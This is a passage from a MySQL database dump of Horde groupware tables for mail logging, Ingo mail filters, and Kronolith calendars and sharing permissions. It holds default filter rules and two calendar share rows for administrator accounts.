CREATE TABLE `imp_sentmail` (
  `sentmail_id` int(10) unsigned NOT NULL AUTO_INCREMENT,
  `sentmail_who` varchar(255) NOT NULL,
  `sentmail_ts` bigint(20) NOT NULL,
  `sentmail_messageid` varchar(255) NOT NULL,
  `sentmail_action` varchar(32) NOT NULL,
  `sentmail_recipient` varchar(255) NOT NULL,
  `sentmail_success` int(11) NOT NULL,
  PRIMARY KEY (`sentmail_id`),
  KEY `index_imp_sentmail_on_sentmail_ts` (`sentmail_ts`),
  KEY `index_imp_sentmail_on_sentmail_who` (`sentmail_who`),
  KEY `index_imp_sentmail_on_sentmail_success` (`sentmail_success`)
) ENGINE=InnoDB DEFAULT CHARSET=utf8;
/*!40101 SET character_set_client = @saved_cs_client */;

--
-- Dumping data for table `imp_sentmail`
--

LOCK TABLES `imp_sentmail` WRITE;
/*!40000 ALTER TABLE `imp_sentmail` DISABLE KEYS */;
/*!40000 ALTER TABLE `imp_sentmail` ENABLE KEYS */;
UNLOCK TABLES;

--
-- Table structure for table `ingo_forwards`
--

DROP TABLE IF EXISTS `ingo_forwards`;
/*!40101 SET @saved_cs_client     = @@character_set_client */;
/*!40101 SET character_set_client = utf8 */;
CREATE TABLE `ingo_forwards` (
  `forward_owner` varchar(255) NOT NULL,
  `forward_addresses` text,
  `forward_keep` int(11) NOT NULL DEFAULT '0'
) ENGINE=InnoDB DEFAULT CHARSET=utf8;
/*!40101 SET character_set_client = @saved_cs_client */;

--
-- Dumping data for table `ingo_forwards`
--

LOCK TABLES `ingo_forwards` WRITE;
/*!40000 ALTER TABLE `ingo_forwards` DISABLE KEYS */;
/*!40000 ALTER TABLE `ingo_forwards` ENABLE KEYS */;
UNLOCK TABLES;

--
-- Table structure for table `ingo_lists`
--

DROP TABLE IF EXISTS `ingo_lists`;
/*!40101 SET @saved_cs_client     = @@character_set_client */;
/*!40101 SET character_set_client = utf8 */;
CREATE TABLE `ingo_lists` (
  `list_owner` varchar(255) NOT NULL,
  `list_blacklist` int(11) DEFAULT '0',
  `list_address` varchar(255) NOT NULL,
  KEY `index_ingo_lists_on_list_owner_and_list_blacklist` (`list_owner`,`list_blacklist`)
) ENGINE=InnoDB DEFAULT CHARSET=utf8;
/*!40101 SET character_set_client = @saved_cs_client */;

--
-- Dumping data for table `ingo_lists`
--

LOCK TABLES `ingo_lists` WRITE;
/*!40000 ALTER TABLE `ingo_lists` DISABLE KEYS */;
/*!40000 ALTER TABLE `ingo_lists` ENABLE KEYS */;
UNLOCK TABLES;

--
-- Table structure for table `ingo_rules`
--

DROP TABLE IF EXISTS `ingo_rules`;
/*!40101 SET @saved_cs_client     = @@character_set_client */;
/*!40101 SET character_set_client = utf8 */;
CREATE TABLE `ingo_rules` (
  `rule_id` int(10) unsigned NOT NULL AUTO_INCREMENT,
  `rule_owner` varchar(255) NOT NULL,
  `rule_name` varchar(255) NOT NULL,
  `rule_action` int(11) NOT NULL,
  `rule_value` varchar(255) DEFAULT NULL,
  `rule_flags` int(11) DEFAULT NULL,
  `rule_conditions` text,
  `rule_combine` int(11) DEFAULT NULL,
  `rule_stop` int(11) DEFAULT NULL,
  `rule_active` int(11) NOT NULL DEFAULT '1',
  `rule_order` int(11) NOT NULL DEFAULT '0',
  PRIMARY KEY (`rule_id`),
  KEY `index_ingo_rules_on_rule_owner` (`rule_owner`)
) ENGINE=InnoDB AUTO_INCREMENT=6 DEFAULT CHARSET=utf8;
/*!40101 SET character_set_client = @saved_cs_client */;

--
-- Dumping data for table `ingo_rules`
--

LOCK TABLES `ingo_rules` WRITE;
/*!40000 ALTER TABLE `ingo_rules` DISABLE KEYS */;
INSERT INTO `ingo_rules` VALUES (1,'mgmtadmin','Whitelist',9,NULL,NULL,NULL,NULL,NULL,1,1),(2,'mgmtadmin','Vacation',8,NULL,NULL,NULL,NULL,NULL,0,2),(3,'mgmtadmin','Blacklist',7,NULL,NULL,NULL,NULL,NULL,1,3),(4,'mgmtadmin','Spam Filter',14,NULL,NULL,NULL,NULL,NULL,0,4),(5,'mgmtadmin','Forward',10,NULL,NULL,NULL,NULL,NULL,0,5);
/*!40000 ALTER TABLE `ingo_rules` ENABLE KEYS */;
UNLOCK TABLES;

--
-- Table structure for table `ingo_schema_info`
--

DROP TABLE IF EXISTS `ingo_schema_info`;
/*!40101 SET @saved_cs_client     = @@character_set_client */;
/*!40101 SET character_set_client = utf8 */;
CREATE TABLE `ingo_schema_info` (
  `version` int(11) DEFAULT NULL
) ENGINE=InnoDB DEFAULT CHARSET=utf8;
/*!40101 SET character_set_client = @saved_cs_client */;

--
-- Dumping data for table `ingo_schema_info`
--

LOCK TABLES `ingo_schema_info` WRITE;
/*!40000 ALTER TABLE `ingo_schema_info` DISABLE KEYS */;
INSERT INTO `ingo_schema_info` VALUES (7);
/*!40000 ALTER TABLE `ingo_schema_info` ENABLE KEYS */;
UNLOCK TABLES;

--
-- Table structure for table `ingo_shares`
--

DROP TABLE IF EXISTS `ingo_shares`;
/*!40101 SET @saved_cs_client     = @@character_set_client */;
/*!40101 SET character_set_client = utf8 */;
CREATE TABLE `ingo_shares` (
  `share_id` int(10) unsigned NOT NULL AUTO_INCREMENT,
  `share_name` varchar(255) NOT NULL,
  `share_owner` varchar(255) NOT NULL,
  `share_flags` int(11) NOT NULL DEFAULT '0',
  `perm_creator` int(11) NOT NULL DEFAULT '0',
  `perm_default` int(11) NOT NULL DEFAULT '0',
  `perm_guest` int(11) NOT NULL DEFAULT '0',
  `attribute_name` varchar(255) NOT NULL,
  `attribute_desc` varchar(255) DEFAULT NULL,
  `share_parents` varchar(4000) DEFAULT NULL,
  PRIMARY KEY (`share_id`),
  KEY `index_ingo_shares_on_share_name` (`share_name`),
  KEY `index_ingo_shares_on_share_owner` (`share_owner`),
  KEY `index_ingo_shares_on_perm_creator` (`perm_creator`),
  KEY `index_ingo_shares_on_perm_default` (`perm_default`),
  KEY `index_ingo_shares_on_perm_guest` (`perm_guest`)
) ENGINE=InnoDB DEFAULT CHARSET=utf8;
/*!40101 SET character_set_client = @saved_cs_client */;

--
-- Dumping data for table `ingo_shares`
--

LOCK TABLES `ingo_shares` WRITE;
/*!40000 ALTER TABLE `ingo_shares` DISABLE KEYS */;
/*!40000 ALTER TABLE `ingo_shares` ENABLE KEYS */;
UNLOCK TABLES;

--
-- Table structure for table `ingo_shares_groups`
--

DROP TABLE IF EXISTS `ingo_shares_groups`;
/*!40101 SET @saved_cs_client     = @@character_set_client */;
/*!40101 SET character_set_client = utf8 */;
CREATE TABLE `ingo_shares_groups` (
  `id` int(10) unsigned NOT NULL AUTO_INCREMENT,
  `share_id` int(11) NOT NULL,
  `group_uid` varchar(255) NOT NULL,
  `perm` int(11) NOT NULL,
  PRIMARY KEY (`id`),
  KEY `index_ingo_shares_groups_on_share_id` (`share_id`),
  KEY `index_ingo_shares_groups_on_group_uid` (`group_uid`),
  KEY `index_ingo_shares_groups_on_perm` (`perm`)
) ENGINE=InnoDB DEFAULT CHARSET=utf8;
/*!40101 SET character_set_client = @saved_cs_client */;

--
-- Dumping data for table `ingo_shares_groups`
--

LOCK TABLES `ingo_shares_groups` WRITE;
/*!40000 ALTER TABLE `ingo_shares_groups` DISABLE KEYS */;
/*!40000 ALTER TABLE `ingo_shares_groups` ENABLE KEYS */;
UNLOCK TABLES;

--
-- Table structure for table `ingo_shares_users`
--

DROP TABLE IF EXISTS `ingo_shares_users`;
/*!40101 SET @saved_cs_client     = @@character_set_client */;
/*!40101 SET character_set_client = utf8 */;
CREATE TABLE `ingo_shares_users` (
  `id` int(10) unsigned NOT NULL AUTO_INCREMENT,
  `share_id` int(11) NOT NULL,
  `user_uid` varchar(255) NOT NULL,
  `perm` int(11) NOT NULL,
  PRIMARY KEY (`id`),
  KEY `index_ingo_shares_users_on_share_id` (`share_id`),
  KEY `index_ingo_shares_users_on_user_uid` (`user_uid`),
  KEY `index_ingo_shares_users_on_perm` (`perm`)
) ENGINE=InnoDB DEFAULT CHARSET=utf8;
/*!40101 SET character_set_client = @saved_cs_client */;

--
-- Dumping data for table `ingo_shares_users`
--

LOCK TABLES `ingo_shares_users` WRITE;
/*!40000 ALTER TABLE `ingo_shares_users` DISABLE KEYS */;
/*!40000 ALTER TABLE `ingo_shares_users` ENABLE KEYS */;
UNLOCK TABLES;

--
-- Table structure for table `ingo_sharesng`
--

DROP TABLE IF EXISTS `ingo_sharesng`;
/*!40101 SET @saved_cs_client     = @@character_set_client */;
/*!40101 SET character_set_client = utf8 */;
CREATE TABLE `ingo_sharesng` (
  `share_id` int(10) unsigned NOT NULL AUTO_INCREMENT,
  `share_name` varchar(255) NOT NULL,
  `share_owner` varchar(255) DEFAULT NULL,
  `share_flags` int(11) NOT NULL DEFAULT '0',
  `perm_creator_2` tinyint(1) NOT NULL DEFAULT '0',
  `perm_creator_4` tinyint(1) NOT NULL DEFAULT '0',
  `perm_creator_8` tinyint(1) NOT NULL DEFAULT '0',
  `perm_creator_16` tinyint(1) NOT NULL DEFAULT '0',
  `perm_default_2` tinyint(1) NOT NULL DEFAULT '0',
  `perm_default_4` tinyint(1) NOT NULL DEFAULT '0',
  `perm_default_8` tinyint(1) NOT NULL DEFAULT '0',
  `perm_default_16` tinyint(1) NOT NULL DEFAULT '0',
  `perm_guest_2` tinyint(1) NOT NULL DEFAULT '0',
  `perm_guest_4` tinyint(1) NOT NULL DEFAULT '0',
  `perm_guest_8` tinyint(1) NOT NULL DEFAULT '0',
  `perm_guest_16` tinyint(1) NOT NULL DEFAULT '0',
  `attribute_name` varchar(255) NOT NULL,
  `attribute_desc` varchar(255) DEFAULT NULL,
  `share_parents` varchar(4000) DEFAULT NULL,
  PRIMARY KEY (`share_id`),
  KEY `index_ingo_sharesng_on_share_name` (`share_name`),
  KEY `index_ingo_sharesng_on_share_owner` (`share_owner`),
  KEY `index_ingo_sharesng_on_perm_creator_2` (`perm_creator_2`),
  KEY `index_ingo_sharesng_on_perm_creator_4` (`perm_creator_4`),
  KEY `index_ingo_sharesng_on_perm_creator_8` (`perm_creator_8`),
  KEY `index_ingo_sharesng_on_perm_creator_16` (`perm_creator_16`),
  KEY `index_ingo_sharesng_on_perm_default_2` (`perm_default_2`),
  KEY `index_ingo_sharesng_on_perm_default_4` (`perm_default_4`),
  KEY `index_ingo_sharesng_on_perm_default_8` (`perm_default_8`),
  KEY `index_ingo_sharesng_on_perm_default_16` (`perm_default_16`),
  KEY `index_ingo_sharesng_on_perm_guest_2` (`perm_guest_2`),
  KEY `index_ingo_sharesng_on_perm_guest_4` (`perm_guest_4`),
  KEY `index_ingo_sharesng_on_perm_guest_8` (`perm_guest_8`),
  KEY `index_ingo_sharesng_on_perm_guest_16` (`perm_guest_16`)
) ENGINE=InnoDB DEFAULT CHARSET=utf8;
/*!40101 SET character_set_client = @saved_cs_client */;

--
-- Dumping data for table `ingo_sharesng`
--

LOCK TABLES `ingo_sharesng` WRITE;
/*!40000 ALTER TABLE `ingo_sharesng` DISABLE KEYS */;
/*!40000 ALTER TABLE `ingo_sharesng` ENABLE KEYS */;
UNLOCK TABLES;

--
-- Table structure for table `ingo_sharesng_groups`
--

DROP TABLE IF EXISTS `ingo_sharesng_groups`;
/*!40101 SET @saved_cs_client     = @@character_set_client */;
/*!40101 SET character_set_client = utf8 */;
CREATE TABLE `ingo_sharesng_groups` (
  `share_id` int(11) NOT NULL,
  `group_uid` varchar(255) NOT NULL,
  `perm_2` tinyint(1) NOT NULL DEFAULT '0',
  `perm_4` tinyint(1) NOT NULL DEFAULT '0',
  `perm_8` tinyint(1) NOT NULL DEFAULT '0',
  `perm_16` tinyint(1) NOT NULL DEFAULT '0',
  KEY `index_ingo_sharesng_groups_on_share_id` (`share_id`),
  KEY `index_ingo_sharesng_groups_on_group_uid` (`group_uid`),
  KEY `index_ingo_sharesng_groups_on_perm_2` (`perm_2`),
  KEY `index_ingo_sharesng_groups_on_perm_4` (`perm_4`),
  KEY `index_ingo_sharesng_groups_on_perm_8` (`perm_8`),
  KEY `index_ingo_sharesng_groups_on_perm_16` (`perm_16`)
) ENGINE=InnoDB DEFAULT CHARSET=utf8;
/*!40101 SET character_set_client = @saved_cs_client */;

--
-- Dumping data for table `ingo_sharesng_groups`
--

LOCK TABLES `ingo_sharesng_groups` WRITE;
/*!40000 ALTER TABLE `ingo_sharesng_groups` DISABLE KEYS */;
/*!40000 ALTER TABLE `ingo_sharesng_groups` ENABLE KEYS */;
UNLOCK TABLES;

--
-- Table structure for table `ingo_sharesng_users`
--

DROP TABLE IF EXISTS `ingo_sharesng_users`;
/*!40101 SET @saved_cs_client     = @@character_set_client */;
/*!40101 SET character_set_client = utf8 */;
CREATE TABLE `ingo_sharesng_users` (
  `share_id` int(11) NOT NULL,
  `user_uid` varchar(255) NOT NULL,
  `perm_2` tinyint(1) NOT NULL DEFAULT '0',
  `perm_4` tinyint(1) NOT NULL DEFAULT '0',
  `perm_8` tinyint(1) NOT NULL DEFAULT '0',
  `perm_16` tinyint(1) NOT NULL DEFAULT '0',
  KEY `index_ingo_sharesng_users_on_share_id` (`share_id`),
  KEY `index_ingo_sharesng_users_on_user_uid` (`user_uid`),
  KEY `index_ingo_sharesng_users_on_perm_2` (`perm_2`),
  KEY `index_ingo_sharesng_users_on_perm_4` (`perm_4`),
  KEY `index_ingo_sharesng_users_on_perm_8` (`perm_8`),
  KEY `index_ingo_sharesng_users_on_perm_16` (`perm_16`)
) ENGINE=InnoDB DEFAULT CHARSET=utf8;
/*!40101 SET character_set_client = @saved_cs_client */;

--
-- Dumping data for table `ingo_sharesng_users`
--

LOCK TABLES `ingo_sharesng_users` WRITE;
/*!40000 ALTER TABLE `ingo_sharesng_users` DISABLE KEYS */;
/*!40000 ALTER TABLE `ingo_sharesng_users` ENABLE KEYS */;
UNLOCK TABLES;

--
-- Table structure for table `ingo_spam`
--

DROP TABLE IF EXISTS `ingo_spam`;
/*!40101 SET @saved_cs_client     = @@character_set_client */;
/*!40101 SET character_set_client = utf8 */;
CREATE TABLE `ingo_spam` (
  `spam_owner` varchar(255) NOT NULL,
  `spam_level` int(11) DEFAULT '5',
  `spam_folder` varchar(255) DEFAULT NULL,
  PRIMARY KEY (`spam_owner`)
) ENGINE=InnoDB DEFAULT CHARSET=utf8;
/*!40101 SET character_set_client = @saved_cs_client */;

--
-- Dumping data for table `ingo_spam`
--

LOCK TABLES `ingo_spam` WRITE;
/*!40000 ALTER TABLE `ingo_spam` DISABLE KEYS */;
/*!40000 ALTER TABLE `ingo_spam` ENABLE KEYS */;
UNLOCK TABLES;

--
-- Table structure for table `ingo_vacations`
--

DROP TABLE IF EXISTS `ingo_vacations`;
/*!40101 SET @saved_cs_client     = @@character_set_client */;
/*!40101 SET character_set_client = utf8 */;
CREATE TABLE `ingo_vacations` (
  `vacation_owner` varchar(255) NOT NULL,
  `vacation_addresses` text,
  `vacation_subject` varchar(255) DEFAULT NULL,
  `vacation_reason` text,
  `vacation_days` int(11) DEFAULT '7',
  `vacation_start` int(11) DEFAULT NULL,
  `vacation_end` int(11) DEFAULT NULL,
  `vacation_excludes` text,
  `vacation_ignorelists` int(11) DEFAULT '1',
  PRIMARY KEY (`vacation_owner`)
) ENGINE=InnoDB DEFAULT CHARSET=utf8;
/*!40101 SET character_set_client = @saved_cs_client */;

--
-- Dumping data for table `ingo_vacations`
--

LOCK TABLES `ingo_vacations` WRITE;
/*!40000 ALTER TABLE `ingo_vacations` DISABLE KEYS */;
/*!40000 ALTER TABLE `ingo_vacations` ENABLE KEYS */;
UNLOCK TABLES;

--
-- Table structure for table `kronolith_events`
--

DROP TABLE IF EXISTS `kronolith_events`;
/*!40101 SET @saved_cs_client     = @@character_set_client */;
/*!40101 SET character_set_client = utf8 */;
CREATE TABLE `kronolith_events` (
  `event_id` varchar(32) NOT NULL,
  `event_uid` varchar(255) NOT NULL,
  `calendar_id` varchar(255) NOT NULL,
  `event_creator_id` varchar(255) NOT NULL,
  `event_description` text,
  `event_location` text,
  `event_status` int(11) DEFAULT '0',
  `event_attendees` text,
  `event_keywords` text,
  `event_exceptions` text,
  `event_title` varchar(255) DEFAULT NULL,
  `event_recurtype` int(11) DEFAULT '0',
  `event_recurinterval` int(11) DEFAULT NULL,
  `event_recurdays` int(11) DEFAULT NULL,
  `event_recurenddate` datetime DEFAULT NULL,
  `event_recurcount` int(11) DEFAULT NULL,
  `event_start` datetime DEFAULT NULL,
  `event_end` datetime DEFAULT NULL,
  `event_alarm` int(11) DEFAULT '0',
  `event_modified` int(11) DEFAULT '0',
  `event_private` int(11) NOT NULL DEFAULT '0',
  `event_allday` int(11) DEFAULT '0',
  `event_alarm_methods` text,
  `event_url` text,
  `event_baseid` varchar(255) DEFAULT '',
  `event_exceptionoriginaldate` datetime DEFAULT NULL,
  `event_resources` text,
  `event_timezone` varchar(50) DEFAULT NULL,
  PRIMARY KEY (`event_id`),
  KEY `index_kronolith_events_on_calendar_id` (`calendar_id`),
  KEY `index_kronolith_events_on_event_uid` (`event_uid`),
  KEY `index_kronolith_events_on_event_baseid` (`event_baseid`)
) ENGINE=InnoDB DEFAULT CHARSET=utf8;
/*!40101 SET character_set_client = @saved_cs_client */;

--
-- Dumping data for table `kronolith_events`
--

LOCK TABLES `kronolith_events` WRITE;
/*!40000 ALTER TABLE `kronolith_events` DISABLE KEYS */;
/*!40000 ALTER TABLE `kronolith_events` ENABLE KEYS */;
UNLOCK TABLES;

--
-- Table structure for table `kronolith_events_geo`
--

DROP TABLE IF EXISTS `kronolith_events_geo`;
/*!40101 SET @saved_cs_client     = @@character_set_client */;
/*!40101 SET character_set_client = utf8 */;
CREATE TABLE `kronolith_events_geo` (
  `event_id` varchar(32) NOT NULL,
  `event_lat` varchar(32) NOT NULL,
  `event_lon` varchar(32) NOT NULL,
  `event_zoom` int(11) NOT NULL DEFAULT '0',
  PRIMARY KEY (`event_id`)
) ENGINE=InnoDB DEFAULT CHARSET=utf8;
/*!40101 SET character_set_client = @saved_cs_client */;

--
-- Dumping data for table `kronolith_events_geo`
--

LOCK TABLES `kronolith_events_geo` WRITE;
/*!40000 ALTER TABLE `kronolith_events_geo` DISABLE KEYS */;
/*!40000 ALTER TABLE `kronolith_events_geo` ENABLE KEYS */;
UNLOCK TABLES;

--
-- Table structure for table `kronolith_events_mysqlgeo`
--

DROP TABLE IF EXISTS `kronolith_events_mysqlgeo`;
/*!40101 SET @saved_cs_client     = @@character_set_client */;
/*!40101 SET character_set_client = utf8 */;
CREATE TABLE `kronolith_events_mysqlgeo` (
  `event_id` varchar(32) NOT NULL,
  `event_coordinates` point NOT NULL,
  `event_zoom` int(11) NOT NULL DEFAULT '0',
  PRIMARY KEY (`event_id`)
) ENGINE=InnoDB DEFAULT CHARSET=utf8;
/*!40101 SET character_set_client = @saved_cs_client */;

--
-- Dumping data for table `kronolith_events_mysqlgeo`
--

LOCK TABLES `kronolith_events_mysqlgeo` WRITE;
/*!40000 ALTER TABLE `kronolith_events_mysqlgeo` DISABLE KEYS */;
/*!40000 ALTER TABLE `kronolith_events_mysqlgeo` ENABLE KEYS */;
UNLOCK TABLES;

--
-- Table structure for table `kronolith_resources`
--

DROP TABLE IF EXISTS `kronolith_resources`;
/*!40101 SET @saved_cs_client     = @@character_set_client */;
/*!40101 SET character_set_client = utf8 */;
CREATE TABLE `kronolith_resources` (
  `resource_id` int(10) unsigned NOT NULL AUTO_INCREMENT,
  `resource_name` varchar(255) DEFAULT NULL,
  `resource_calendar` varchar(255) DEFAULT NULL,
  `resource_description` text,
  `resource_response_type` int(11) DEFAULT '0',
  `resource_type` varchar(255) NOT NULL,
  `resource_members` text,
  `resource_email` varchar(255) DEFAULT NULL,
  PRIMARY KEY (`resource_id`),
  KEY `index_kronolith_resources_on_resource_calendar` (`resource_calendar`),
  KEY `index_kronolith_resources_on_resource_type` (`resource_type`)
) ENGINE=InnoDB DEFAULT CHARSET=utf8;
/*!40101 SET character_set_client = @saved_cs_client */;

--
-- Dumping data for table `kronolith_resources`
--

LOCK TABLES `kronolith_resources` WRITE;
/*!40000 ALTER TABLE `kronolith_resources` DISABLE KEYS */;
/*!40000 ALTER TABLE `kronolith_resources` ENABLE KEYS */;
UNLOCK TABLES;

--
-- Table structure for table `kronolith_schema_info`
--

DROP TABLE IF EXISTS `kronolith_schema_info`;
/*!40101 SET @saved_cs_client     = @@character_set_client */;
/*!40101 SET character_set_client = utf8 */;
CREATE TABLE `kronolith_schema_info` (
  `version` int(11) DEFAULT NULL
) ENGINE=InnoDB DEFAULT CHARSET=utf8;
/*!40101 SET character_set_client = @saved_cs_client */;

--
-- Dumping data for table `kronolith_schema_info`
--

LOCK TABLES `kronolith_schema_info` WRITE;
/*!40000 ALTER TABLE `kronolith_schema_info` DISABLE KEYS */;
INSERT INTO `kronolith_schema_info` VALUES (23);
/*!40000 ALTER TABLE `kronolith_schema_info` ENABLE KEYS */;
UNLOCK TABLES;

--
-- Table structure for table `kronolith_shares`
--

DROP TABLE IF EXISTS `kronolith_shares`;
/*!40101 SET @saved_cs_client     = @@character_set_client */;
/*!40101 SET character_set_client = utf8 */;
CREATE TABLE `kronolith_shares` (
  `share_id` int(10) unsigned NOT NULL AUTO_INCREMENT,
  `share_name` varchar(255) NOT NULL,
  `share_owner` varchar(255) DEFAULT NULL,
  `share_flags` int(11) NOT NULL DEFAULT '0',
  `perm_creator` int(11) NOT NULL DEFAULT '0',
  `perm_default` int(11) NOT NULL DEFAULT '0',
  `perm_guest` int(11) NOT NULL DEFAULT '0',
  `attribute_name` varchar(255) NOT NULL,
  `attribute_desc` varchar(255) DEFAULT NULL,
  `attribute_color` varchar(7) DEFAULT NULL,
  `share_parents` varchar(4000) DEFAULT NULL,
  PRIMARY KEY (`share_id`),
  KEY `index_kronolith_shares_on_share_name` (`share_name`),
  KEY `index_kronolith_shares_on_share_owner` (`share_owner`),
  KEY `index_kronolith_shares_on_perm_creator` (`perm_creator`),
  KEY `index_kronolith_shares_on_perm_default` (`perm_default`),
  KEY `index_kronolith_shares_on_perm_guest` (`perm_guest`)
) ENGINE=InnoDB DEFAULT CHARSET=utf8;
/*!40101 SET character_set_client = @saved_cs_client */;

--
-- Dumping data for table `kronolith_shares`
--

LOCK TABLES `kronolith_shares` WRITE;
/*!40000 ALTER TABLE `kronolith_shares` DISABLE KEYS */;
/*!40000 ALTER TABLE `kronolith_shares` ENABLE KEYS */;
UNLOCK TABLES;

--
-- Table structure for table `kronolith_shares_groups`
--

DROP TABLE IF EXISTS `kronolith_shares_groups`;
/*!40101 SET @saved_cs_client     = @@character_set_client */;
/*!40101 SET character_set_client = utf8 */;
CREATE TABLE `kronolith_shares_groups` (
  `id` int(10) unsigned NOT NULL AUTO_INCREMENT,
  `share_id` int(11) NOT NULL,
  `group_uid` varchar(255) NOT NULL,
  `perm` int(11) NOT NULL,
  PRIMARY KEY (`id`),
  KEY `index_kronolith_shares_groups_on_share_id` (`share_id`),
  KEY `index_kronolith_shares_groups_on_group_uid` (`group_uid`),
  KEY `index_kronolith_shares_groups_on_perm` (`perm`)
) ENGINE=InnoDB DEFAULT CHARSET=utf8;
/*!40101 SET character_set_client = @saved_cs_client */;

--
-- Dumping data for table `kronolith_shares_groups`
--

LOCK TABLES `kronolith_shares_groups` WRITE;
/*!40000 ALTER TABLE `kronolith_shares_groups` DISABLE KEYS */;
/*!40000 ALTER TABLE `kronolith_shares_groups` ENABLE KEYS */;
UNLOCK TABLES;

--
-- Table structure for table `kronolith_shares_users`
--

DROP TABLE IF EXISTS `kronolith_shares_users`;
/*!40101 SET @saved_cs_client     = @@character_set_client */;
/*!40101 SET character_set_client = utf8 */;
CREATE TABLE `kronolith_shares_users` (
  `id` int(10) unsigned NOT NULL AUTO_INCREMENT,
  `share_id` int(11) NOT NULL,
  `user_uid` varchar(255) NOT NULL,
  `perm` int(11) NOT NULL,
  PRIMARY KEY (`id`),
  KEY `index_kronolith_shares_users_on_share_id` (`share_id`),
  KEY `index_kronolith_shares_users_on_user_uid` (`user_uid`),
  KEY `index_kronolith_shares_users_on_perm` (`perm`)
) ENGINE=InnoDB DEFAULT CHARSET=utf8;
/*!40101 SET character_set_client = @saved_cs_client */;

--
-- Dumping data for table `kronolith_shares_users`
--

LOCK TABLES `kronolith_shares_users` WRITE;
/*!40000 ALTER TABLE `kronolith_shares_users` DISABLE KEYS */;
/*!40000 ALTER TABLE `kronolith_shares_users` ENABLE KEYS */;
UNLOCK TABLES;

--
-- Table structure for table `kronolith_sharesng`
--

DROP TABLE IF EXISTS `kronolith_sharesng`;
/*!40101 SET @saved_cs_client     = @@character_set_client */;
/*!40101 SET character_set_client = utf8 */;
CREATE TABLE `kronolith_sharesng` (
  `share_id` int(10) unsigned NOT NULL AUTO_INCREMENT,
  `share_name` varchar(255) NOT NULL,
  `share_owner` varchar(255) DEFAULT NULL,
  `share_flags` int(11) NOT NULL DEFAULT '0',
  `perm_creator_2` tinyint(1) NOT NULL DEFAULT '0',
  `perm_creator_4` tinyint(1) NOT NULL DEFAULT '0',
  `perm_creator_8` tinyint(1) NOT NULL DEFAULT '0',
  `perm_creator_16` tinyint(1) NOT NULL DEFAULT '0',
  `perm_creator_1024` tinyint(1) NOT NULL DEFAULT '0',
  `perm_default_2` tinyint(1) NOT NULL DEFAULT '0',
  `perm_default_4` tinyint(1) NOT NULL DEFAULT '0',
  `perm_default_8` tinyint(1) NOT NULL DEFAULT '0',
  `perm_default_16` tinyint(1) NOT NULL DEFAULT '0',
  `perm_default_1024` tinyint(1) NOT NULL DEFAULT '0',
  `perm_guest_2` tinyint(1) NOT NULL DEFAULT '0',
  `perm_guest_4` tinyint(1) NOT NULL DEFAULT '0',
  `perm_guest_8` tinyint(1) NOT NULL DEFAULT '0',
  `perm_guest_16` tinyint(1) NOT NULL DEFAULT '0',
  `perm_guest_1024` tinyint(1) NOT NULL DEFAULT '0',
  `attribute_name` varchar(255) NOT NULL,
  `attribute_desc` varchar(255) DEFAULT NULL,
  `attribute_color` varchar(7) DEFAULT NULL,
  `share_parents` varchar(4000) DEFAULT NULL,
  PRIMARY KEY (`share_id`),
  KEY `index_kronolith_sharesng_on_share_name` (`share_name`),
  KEY `index_kronolith_sharesng_on_share_owner` (`share_owner`),
  KEY `index_kronolith_sharesng_on_perm_creator_2` (`perm_creator_2`),
  KEY `index_kronolith_sharesng_on_perm_creator_4` (`perm_creator_4`),
  KEY `index_kronolith_sharesng_on_perm_creator_8` (`perm_creator_8`),
  KEY `index_kronolith_sharesng_on_perm_creator_16` (`perm_creator_16`),
  KEY `index_kronolith_sharesng_on_perm_creator_1024` (`perm_creator_1024`),
  KEY `index_kronolith_sharesng_on_perm_default_2` (`perm_default_2`),
  KEY `index_kronolith_sharesng_on_perm_default_4` (`perm_default_4`),
  KEY `index_kronolith_sharesng_on_perm_default_8` (`perm_default_8`),
  KEY `index_kronolith_sharesng_on_perm_default_16` (`perm_default_16`),
  KEY `index_kronolith_sharesng_on_perm_default_1024` (`perm_default_1024`),
  KEY `index_kronolith_sharesng_on_perm_guest_2` (`perm_guest_2`),
  KEY `index_kronolith_sharesng_on_perm_guest_4` (`perm_guest_4`),
  KEY `index_kronolith_sharesng_on_perm_guest_8` (`perm_guest_8`),
  KEY `index_kronolith_sharesng_on_perm_guest_16` (`perm_guest_16`),
  KEY `index_kronolith_sharesng_on_perm_guest_1024` (`perm_guest_1024`)
) ENGINE=InnoDB AUTO_INCREMENT=3 DEFAULT CHARSET=utf8;
/*!40101 SET character_set_client = @saved_cs_client */;

--
-- Dumping data for table `kronolith_sharesng`
--

LOCK TABLES `kronolith_sharesng` WRITE;
/*!40000 ALTER TABLE `kronolith_sharesng` DISABLE KEYS */;
INSERT INTO `kronolith_sharesng` VALUES (1,'CnHSSSn4PgtK6fI18evE6KU','Administrator',0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,'Calendar of Administrator',NULL,'#b72419',NULL),(2,'eA0g0r_C8CgURv-sUjTOSVC','mgmtadmin',0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,'Calendar of mgmtadmin',NULL,'#51b799',NULL);
/*!40000 ALTER TABLE `kronolith_sharesng` ENABLE KEYS */;
UNLOCK TABLES;

--
-- Table structure for table `kronolith_sharesng_groups`
--

DROP TABLE IF EXISTS `kronolith_sharesng_groups`;
/*!40101 SET @saved_cs_client     = @@character_set_client */;
/*!40101 SET character_set_client = utf8 */;
CREATE TABLE `kronolith_sharesng_groups` (
  `share_id` int(11) NOT NULL,
  `group_uid` varchar(255) NOT NULL,
  `perm_2` tinyint(1) NOT NULL DEFAULT '0',
  `perm_4` tinyint(1) NOT NULL DEFAULT '0',
  `perm_8` tinyint(1) NOT NULL DEFAULT '0',
  `perm_16` tinyint(1) NOT NULL DEFAULT '0',
  `perm_1024` tinyint(1) NOT NULL DEFAULT '0',
  KEY `index_kronolith_sharesng_groups_on_share_id` (`share_id`),
  KEY `index_kronolith_sharesng_groups_on_group_uid` (`group_uid`),
  KEY `index_kronolith_sharesng_groups_on_perm_2` (`perm_2`),
  KEY `index_kronolith_sharesng_groups_on_perm_4` (`perm_4`),
  KEY `index_kronolith_sharesng_groups_on_perm_8` (`perm_8`),
  KEY `index_kronolith_sharesng_groups_on_perm_16` (`perm_16`),
  KEY `index_kronolith_sharesng_groups_on_perm_1024` (`perm_1024`)
) ENGINE=InnoDB DEFAULT CHARSET=utf8;
/*!40101 SET character_set_client = @saved_cs_client */;

--
-- Dumping data for table `kronolith_sharesng_groups`
--

LOCK TABLES `kronolith_sharesng_groups` WRITE;
/*!40000 ALTER TABLE `kronolith_sharesng_groups` DISABLE KEYS */;
/*!40000 ALTER TABLE `kronolith_sharesng_groups` ENABLE KEYS */;
UNLOCK TABLES;

--
